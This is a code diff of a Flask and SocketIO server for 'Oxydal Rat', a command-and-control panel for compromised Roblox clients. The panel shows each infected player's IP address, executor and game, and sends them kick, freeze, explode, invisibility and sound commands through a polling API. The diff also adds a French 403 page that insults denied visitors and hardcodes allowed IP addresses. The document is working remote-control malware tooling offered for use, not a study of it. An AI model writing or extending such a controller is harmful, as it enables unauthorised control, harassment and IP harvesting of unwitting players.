@@ -6,7 +6,7 @@ import eventlet
 eventlet.monkey_patch()
 
 app = Flask(__name__)
-app.config["SECRET_KEY"] = "oxydal_emerald_key_2024"
+app.config["SECRET_KEY"] = "super_secret_key_change_me_123456"
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")
 
 ALLOWED_IPS = {"37.66.149.36", "91.170.86.224"}
@@ -22,242 +22,200 @@ def check_ip():
     if ip not in ALLOWED_IPS:
         abort(403)
 
+@app.errorhandler(403)
+def access_denied(e):
+    detected = request.headers.get("X-Forwarded-For", request.remote_addr)
+    if detected and "," in detected:
+        detected = detected.split(",")[0].strip()
+    return f"""
+    <html>
+      <body style="background:#000;color:#ff3366;font-family:Arial;text-align:center;padding-top:15%;">
+        <h1>Accès refusé</h1>
+        <p>Ta crue quoi fdp ?</p>
+        <p>Ton IP : <b>{detected}</b></p>
+      </body>
+    </html>
+    """, 403
+
 @app.before_request
 def protect_routes():
     if request.path in ["/", "/kick", "/troll"]:
         check_ip()
 
-# --- DESIGN EMERALD AVEC OPTION DE SUPPRESSION LOCALE ---
-
 HTML = """<!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>Oxydal Rat | Emerald Command</title>
-    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
-    <style>
-        :root {
-            --primary: #00ffcc;
-            --primary-glow: rgba(0, 255, 204, 0.4);
-            --bg: #030a0e;
-            --card-bg: rgba(6, 18, 24, 0.85);
-            --border: rgba(0, 255, 204, 0.15);
-            --danger: #ff3366;
-            --warning: #ffcc00;
-        }
-
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        
-        body {
-            font-family: 'Inter', sans-serif;
-            background: radial-gradient(circle at top right, #0a1f26 0%, #030a0e 100%);
-            color: #fff;
-            min-height: 100vh;
-            padding: 20px;
-        }
-
-        header { text-align: center; margin-bottom: 40px; }
-        h1 {
-            font-family: 'Orbitron', sans-serif;
-            font-size: 3rem;
-            color: var(--primary);
-            text-shadow: 0 0 15px var(--primary-glow);
-            letter-spacing: 5px;
-        }
-
-        .stats-bar {
-            background: var(--card-bg);
-            border: 1px solid var(--border);
-            border-radius: 50px;
-            padding: 8px 25px;
-            display: inline-flex;
-            align-items: center; gap: 15px;
-            margin-top: 15px;
-            font-family: 'Orbitron'; font-size: 0.9rem;
-        }
-
-        .grid { 
-            display: grid; 
-            grid-template-columns: repeat(auto-fill, minmax(360px, 1fr)); 
-            gap: 25px; 
-            max-width: 1400px; margin: auto;
-        }
-
-        /* Card Styling */
-        .card {
-            background: var(--card-bg);
-            border: 1px solid var(--border);
-            border-radius: 12px;
-            padding: 20px;
-            position: relative;
-            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
-            animation: cardIn 0.5s ease-out;
-        }
-
-        @keyframes cardIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
-        
-        /* Bouton Fermer (Croix) */
-        .close-btn {
-            position: absolute;
-            top: 12px; right: 12px;
-            width: 24px; height: 24px;
-            background: rgba(255,255,255,0.05);
-            border-radius: 50%;
-            display: flex; align-items: center; justify-content: center;
-            cursor: pointer; color: #666; font-weight: bold;
-            transition: all 0.2s; border: 1px solid transparent;
-        }
-        .close-btn:hover {
-            background: var(--danger);
-            color: #fff; transform: rotate(90deg);
-        }
-
-        .card-header { margin-bottom: 15px; padding-right: 30px; }
-        .player-name { font-family: 'Orbitron'; font-size: 1.2rem; color: var(--primary); display: block; }
-        
-        .status-tag {
-            font-size: 0.7rem; font-weight: bold; display: flex; align-items: center; gap: 5px; margin-top: 5px;
-        }
-        .dot { width: 8px; height: 8px; border-radius: 50%; background: #444; }
-        .dot.online { background: var(--primary); box-shadow: 0 0 8px var(--primary); }
-
-        .player-info { font-size: 0.8rem; color: #888; margin-bottom: 15px; line-height: 1.4; }
-        .player-info b { color: #ccc; }
-
-        .cat-title { font-size: 0.7rem; color: #555; text-transform: uppercase; margin: 15px 0 8px; letter-spacing: 1px; }
-
-        /* Buttons */
-        .btn-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
-        button {
-            padding: 8px; border-radius: 4px; border: 1px solid var(--border);
-            background: rgba(255,255,255,0.02); color: #bbb;
-            font-family: 'Orbitron'; font-size: 0.65rem; cursor: pointer; transition: 0.2s;
-        }
-        button:hover { background: var(--primary); color: #000; border-color: var(--primary); }
-        button.kick { border-color: var(--danger); color: var(--danger); }
-        button.kick:hover { background: var(--danger); color: #fff; }
-
-        /* Animation suppression */
-        .hidden-card { opacity: 0; transform: scale(0.5) translateY(-50px); pointer-events: none; }
-
-        /* Modals & Toasts simplifiés */
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); align-items: center; justify-content: center; z-index: 100; }
-        .modal.active { display: flex; }
-        .modal-content { background: #050f14; border: 1px solid var(--primary); padding: 25px; border-radius: 10px; width: 300px; text-align: center; }
-        input { width: 100%; padding: 10px; margin: 15px 0; background: #000; border: 1px solid var(--border); color: #fff; outline: none; }
-    </style>
+<meta charset="UTF-8">
+<title>Oxydal Rat</title>
+<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&family=Inter:wght@400;600&display=swap" rel="stylesheet">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:Inter,sans-serif;background:radial-gradient(circle at top,#0f2027,#000);color:#fff;min-height:100vh}
+.container{max-width:1200px;margin:auto;padding:40px}
+h1{font-family:Orbitron;font-size:3.5rem;text-align:center;color:#00ffaa;text-shadow:0 0 30px #00ffaa;margin-bottom:20px}
+.stats{text-align:center;margin:30px 0;font-size:1.8rem}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(360px,1fr));gap:25px}
+.card{background:rgba(20,20,20,.9);border-radius:18px;padding:25px;box-shadow:0 0 30px rgba(0,0,0,.7);transition:transform .3s}
+.card:hover{transform:translateY(-8px)}
+.status{display:flex;align-items:center;gap:10px;margin-bottom:15px}
+.dot{width:14px;height:14px;border-radius:50%;background:red;box-shadow:0 0 12px red}
+.dot.online{background:#00ffaa;box-shadow:0 0 18px #00ffaa}
+.name{font-size:1.8rem;font-weight:600;color:#ffcc00;margin-bottom:10px}
+.name a{color:#ffcc00;text-decoration:none}
+.name a:hover{text-decoration:underline}
+.info{font-size:1rem;color:#aaa;margin-bottom:20px;line-height:1.5}
+.category{font-weight:bold;color:#00ffaa;margin:15px 0 10px;font-size:1.1rem}
+button.kick-btn{padding:12px;border:none;border-radius:12px;cursor:pointer;font-weight:bold;font-size:0.95rem;color:white;transition:transform .2s;margin-bottom:8px}
+button.kick-btn:hover{transform:scale(1.05)}
+button.kick-btn:disabled{background:#444 !important;cursor:not-allowed;transform:none}
+.modal{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.8);align-items:center;justify-content:center;z-index:1000}
+.modal.active{display:flex}
+.modal-content{background:#111;padding:30px;border-radius:20px;width:90%;max-width:500px;box-shadow:0 0 40px rgba(255,51,102,0.5)}
+.modal-content h2{text-align:center;color:#ff3366;margin-bottom:20px}
+.modal-content input{width:100%;padding:15px;border-radius:12px;border:none;background:#222;color:white;font-size:1.1rem;margin-bottom:20px}
+.modal-buttons{display:flex;gap:15px}
+.modal-buttons button{flex:1;padding:14px;border:none;border-radius:12px;font-weight:bold;cursor:pointer}
+.confirm-btn{background:linear-gradient(45deg,#ff3366,#ff5588);color:white}
+.cancel-btn{background:#444;color:white}
+.toast-container{position:fixed;bottom:25px;right:25px;z-index:999}
+.toast{background:#111;border-left:5px solid #00ffaa;padding:15px 20px;margin-top:12px;border-radius:10px;box-shadow:0 0 15px rgba(0,0,0,0.6)}
+.toast.danger{border-color:#ff3366}
+</style>
 </head>
 <body>
-
-<header>
-    <h1>OXYDAL <span style="font-weight:300">RAT</span></h1>
-    <div class="stats-bar">
-        <span>ONLINE: <span id="online-count" style="color:var(--primary)">0</span></span>
-        <span style="opacity:0.3">|</span>
-        <span id="total-count">TOTAL: 0</span>
-    </div>
-</header>
-
-<div class="grid" id="players"></div>
+<div class="container">
+    <h1>Oxydal Rat</h1>
+    <div class="stats" id="stats">Players online: <b>0</b></div>
+    <div class="grid" id="players"></div>
+</div>
 
 <div class="modal" id="kickModal">
     <div class="modal-content">
-        <h2 style="font-family:Orbitron; font-size:1rem;">TERMINATE USER</h2>
-        <input type="text" id="kickReason" placeholder="Reason...">
-        <div class="btn-grid">
-            <button onclick="closeModal()">CANCEL</button>
-            <button onclick="performKick()" class="kick">EXECUTE</button>
+        <h2>Kick Player</h2>
+        <input type="text" id="kickReason" placeholder="Reason (optional)" autofocus>
+        <div class="modal-buttons">
+            <button class="cancel-btn" id="cancelKick">Cancel</button>
+            <button class="confirm-btn" id="confirmKick">Confirm</button>
         </div>
     </div>
 </div>
 
+<div class="modal" id="playSoundModal">
+    <div class="modal-content" style="border-left:5px solid orange; box-shadow:0 0 40px rgba(255,165,0,0.7);">
+        <h2 style="color:orange;">Play Sound</h2>
+        <input type="text" id="soundAssetId" placeholder="Enter Asset ID" autofocus>
+        <div class="modal-buttons">
+            <button class="cancel-btn" id="cancelSound">Cancel</button>
+            <button class="confirm-btn" id="confirmSound" style="background:linear-gradient(45deg,orange,#ff9900);">Confirm</button>
+        </div>
+    </div>
+</div>
+
+<div class="toast-container" id="toasts"></div>
+
 <script>
-    const socket = io();
-    let selectedId = null;
-    let localHiddenPlayers = new Set(); // Pour stocker les joueurs masqués manuellement
+const socket = io();
+let currentKickId = null;
+const kickModal = document.getElementById("kickModal");
 
-    function hidePlayer(id) {
-        const card = document.getElementById(`card_${id}`);
-        if(card) {
-            card.classList.add("hidden-card");
-            localHiddenPlayers.add(id);
-            setTimeout(() => card.remove(), 400);
-        }
-    }
+function toast(msg, type = "success") {
+    const t = document.createElement("div");
+    t.className = "toast " + (type === "danger" ? "danger" : "");
+    t.textContent = msg;
+    document.getElementById("toasts").appendChild(t);
+    setTimeout(() => t.remove(), 5000);
+}
 
-    function openKick(id) { selectedId = id; document.getElementById("kickModal").classList.add("active"); }
-    function closeModal() { document.getElementById("kickModal").classList.remove("active"); }
+function openKickModal(id) { currentKickId = id; kickModal.classList.add("active"); document.getElementById("kickReason").focus(); }
+function closeModal() { kickModal.classList.remove("active"); }
+function performKick() {
+    if (!currentKickId) return;
+    const reason = document.getElementById("kickReason").value.trim() || "Kicked by admin";
+    fetch("/kick", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({userid: currentKickId, reason: reason})});
+    toast(`Kick sent`, "danger");
+    closeModal();
+}
 
-    function performKick() {
-        const r = document.getElementById("kickReason").value || "Admin Kick";
-        fetch("/kick", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({userid: selectedId, reason: r})});
-        closeModal();
-    }
+const playSoundModal = document.getElementById("playSoundModal");
+let currentSoundId = null;
+function openPlaySoundModal(id) {
+    currentSoundId = id;
+    playSoundModal.classList.add("active");
+    document.getElementById("soundAssetId").focus();
+}
+function closeSoundModal() { playSoundModal.classList.remove("active"); }
+function performPlaySound() {
+    if (!currentSoundId) return;
+    const assetId = document.getElementById("soundAssetId").value.trim();
+    if(!assetId) return toast("Enter a valid Asset ID", "danger");
+    sendTroll(currentSoundId, "playsound", assetId);
+    closeSoundModal();
+}
 
-    function sendTroll(id, cmd) {
-        fetch("/troll", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({userid: id, cmd: cmd})});
-    }
+function sendTroll(id, cmd, assetId = null) {
+    const body = {userid: id, cmd: cmd};
+    if(assetId) body["assetId"] = assetId;
+    fetch("/troll", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify(body)});
+    toast(`${cmd.toUpperCase()} sent`, "danger");
+}
 
-    socket.on("update", (data) => {
-        document.getElementById("online-count").textContent = data.online;
-        document.getElementById("total-count").textContent = `TOTAL: ${data.total}`;
-        const grid = document.getElementById("players");
+document.getElementById("cancelKick").onclick = closeModal;
+document.getElementById("confirmKick").onclick = performKick;
+kickModal.onclick = (e) => { if (e.target === kickModal) closeModal(); };
 
-        Object.entries(data.players).forEach(([id, p]) => {
-            // Si le joueur est dans notre liste "masquée", on ne l'affiche pas
-            if(localHiddenPlayers.has(id)) return;
+document.getElementById("cancelSound").onclick = closeSoundModal;
+document.getElementById("confirmSound").onclick = performPlaySound;
+playSoundModal.onclick = (e) => { if (e.target === playSoundModal) closeSoundModal(); };
 
-            let card = document.getElementById(`card_${id}`);
-            if(!card) {
-                card = document.createElement("div");
-                card.className = "card";
-                card.id = `card_${id}`;
-                grid.appendChild(card);
-            }
+function render(data) {
+    document.getElementById("stats").innerHTML = `Players online: <b>${data.online}</b> / ${data.total}`;
+    const grid = document.getElementById("players");
+    const currentIds = new Set(Object.keys(data.players));
+    
+    Object.entries(data.players).forEach(([id, p]) => {
+        let card = document.getElementById(`card_${id}`);
+        if (!card) { card = document.createElement("div"); card.className = "card"; card.id = `card_${id}`; grid.appendChild(card); }
 
-            card.innerHTML = `
-                <div class="close-btn" onclick="hidePlayer('${id}')">×</div>
-                <div class="card-header">
-                    <span class="player-name">${p.username}</span>
-                    <div class="status-tag">
-                        <div class="dot ${p.online ? "online" : ""}"></div>
-                        <span style="opacity:0.6">${p.online ? "STABLE" : "LOST"}</span>
-                    </div>
-                </div>
-                <div class="player-info">
-                    IP: <b>${p.ip}</b><br>
-                    EXE: <b>${p.executor}</b><br>
-                    GAME ID: <b>${p.gameId}</b>
-                </div>
-                
-                <div class="cat-title">Infection Actions</div>
-                <div class="btn-grid">
-                    <button class="kick" onclick="openKick('${id}')">KICK</button>
-                    <button onclick="sendTroll('${id}','freeze')">FREEZE</button>
-                    <button onclick="sendTroll('${id}','spin')">SPIN</button>
-                    <button onclick="sendTroll('${id}','explode')">EXPLODE</button>
-                </div>
-                <div class="cat-title">Maintenance</div>
-                <div class="btn-grid">
-                    <button onclick="sendTroll('${id}','unfreeze')" style="font-size:0.5rem">UNFREEZE</button>
-                    <button onclick="sendTroll('${id}','unspin')" style="font-size:0.5rem">UNSPIN</button>
-                </div>
-            `;
-        });
-
-        // Supprimer les cartes des joueurs qui ne sont plus dans la liste serveur
-        const serverIds = new Set(Object.keys(data.players));
-        document.querySelectorAll('.card').forEach(c => {
-            const cid = c.id.replace('card_', '');
-            if(!serverIds.has(cid)) c.remove();
-        });
+        card.innerHTML = `
+            <div class="status"><div class="dot ${p.online ? "online" : ""}"></div><span>${p.online ? "Online" : "Offline"}</span></div>
+            <div class="name"><a href="https://www.roblox.com/users/${id}/profile" target="_blank">${p.username}</a> (ID ${id})</div>
+            <div class="info">Executor: ${p.executor}<br>IP: ${p.ip}<br>
+            Game: <a href="https://www.roblox.com/fr/games/${p.gameId}" target="_blank">${p.game}</a><br>
+            JobId: ${p.jobId}</div>
+            <div class="category">TROLLS</div>
+            <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
+                <button class="kick-btn" style="background:linear-gradient(45deg,#ff3366,#ff5588);" onclick="openKickModal('${id}')">KICK</button>
+                <button class="kick-btn" style="background:linear-gradient(45deg,#ff00ff,#aa00aa);" onclick="sendTroll('${id}','freeze')">FREEZE</button>
+                <button class="kick-btn" style="background:linear-gradient(45deg,#00ffff,#00aaaa);" onclick="sendTroll('${id}','spin')">SPIN</button>
+                <button class="kick-btn" style="background:linear-gradient(45deg,#ffff00,#aaaa00);" onclick="sendTroll('${id}','jump')">JUMP</button>
+                <button class="kick-btn" style="background:linear-gradient(45deg,#88ff88,#55aa55);" onclick="sendTroll('${id}','rainbow')">RAINBOW</button>
+                <button class="kick-btn" style="background:linear-gradient(45deg,#ff5555,#aa0000);" onclick="sendTroll('${id}','explode')">EXPLODE</button>
+                <button class="kick-btn" style="background:linear-gradient(45deg,#5555ff,#0000aa);" onclick="sendTroll('${id}','invisible')">INVISIBLE</button>
+                <button class="kick-btn" style="background:orange;" onclick="openPlaySoundModal('${id}')">PLAY SOUND</button>
+            </div>
+            <div class="category">UNDO</div>
+            <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
+                <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','unfreeze')">UNFREEZE</button>
+                <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','unspin')">UNSPIN</button>
+                <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','unrainbow')">STOP RAINBOW</button>
+                <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','uninvisible')">UNINVISIBLE</button>
+                <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','stopsound')">STOP SOUND</button>
+            </div>
+        `;
     });
+    
+    document.querySelectorAll('.card').forEach(c => {
+        if (!currentIds.has(c.id.replace('card_', ''))) c.remove();
+    });
+}
+
+socket.on("update", render);
+socket.on("kick_notice", d => toast(`${d.username} → ${d.reason}`, "danger"));
+socket.on("status", d => toast(`${d.username} is now ${d.online ? "online" : "offline"}`));
 </script>
 </body>
 </html>"""
-
-# --- LE RESTE DU CODE PYTHON RESTE IDENTIQUE ---
 
 @app.route("/")
 def index():
@@ -294,25 +252,38 @@ def api():
             return jsonify({"command": "kick", "reason": reason})
         if uid in pending_commands:
             cmd = pending_commands.pop(uid)
-            return jsonify({"command": cmd.get("cmd") if isinstance(cmd, dict) else cmd, "assetId": cmd.get("assetId") if isinstance(cmd, dict) else None})
+            assetId = None
+            if isinstance(cmd, dict):
+                assetId = cmd.get("assetId")
+                cmd = cmd.get("cmd")
+            return jsonify({"command": cmd, "assetId": assetId})
         return jsonify({})
 
 @app.route("/kick", methods=["POST"])
 def kick():
     check_ip()
     data = request.get_json() or {}
-    uid, reason = str(data.get("userid", "")), data.get("reason", "No reason")
+    uid = str(data.get("userid", ""))
+    reason = data.get("reason", "No reason")
     pending_kicks[uid] = reason
-    socketio.emit("kick_notice", {"username": "User", "reason": reason})
+    name = connected_players.get(uid, {}).get("username", "Unknown")
+    socketio.emit("kick_notice", {"username": name, "reason": f"KICK: {reason}"})
     return jsonify({"sent": True})
 
 @app.route("/troll", methods=["POST"])
 def troll():
     check_ip()
     data = request.get_json() or {}
-    uid, cmd = str(data.get("userid", "")), data.get("cmd", "")
+    uid = str(data.get("userid", ""))
+    cmd = data.get("cmd", "")
+    assetId = data.get("assetId", None)
     if uid and cmd:
-        pending_commands[uid] = cmd
+        if assetId:
+            pending_commands[uid] = {"cmd": cmd, "assetId": assetId}
+        else:
+            pending_commands[uid] = cmd
+        name = connected_players.get(uid, {}).get("username", "Unknown")
+        socketio.emit("kick_notice", {"username": name, "reason": cmd.upper()})
     return jsonify({"sent": True})
 
 def broadcast_loop():
@@ -321,14 +292,20 @@ def broadcast_loop():
         online = 0
         to_remove = []
         for uid, p in connected_players.items():
-            if now - p["last"] > 30: to_remove.append(uid)
+            if now - p["last"] > 30:
+                to_remove.append(uid)
             else:
                 p["online"] = now - p["last"] < 15
                 if p["online"]: online += 1
-        for uid in to_remove: connected_players.pop(uid, None)
+        for uid in to_remove:
+            username = connected_players.pop(uid, {}).get("username", "Unknown")
+            socketio.emit("status", {"username": username, "online": False})
         socketio.emit("update", {"players": connected_players, "online": online, "total": len(connected_players)})
         socketio.sleep(2)
 
 if __name__ == "__main__":
     socketio.start_background_task(broadcast_loop)
     socketio.run(app, host="0.0.0.0", port=5000)
+
+
+
